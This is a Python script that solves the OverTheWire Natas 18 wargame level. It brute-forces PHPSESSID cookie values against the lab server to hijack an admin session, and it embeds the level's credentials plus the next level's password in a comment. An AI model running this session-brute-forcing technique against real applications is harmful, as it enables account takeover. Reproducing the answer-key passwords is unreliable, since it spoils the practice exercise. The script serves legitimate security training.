import requests

URL = "http://natas18.natas.labs.overthewire.org/"
Username='natas18'
Password='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

i = 0
while i < 641:
    session = 'PHPSESSID='+str(i)
    query = {'username':'a','password':'a'}
    res = requests.post(URL, data=query, headers = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': session} , auth=(Username, Password) )
    if not 'regular' in (str(res.content, 'utf-8')):
        print('Result', i)
        break
    print(i)
    i = i+1

# Username: natas19
# Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs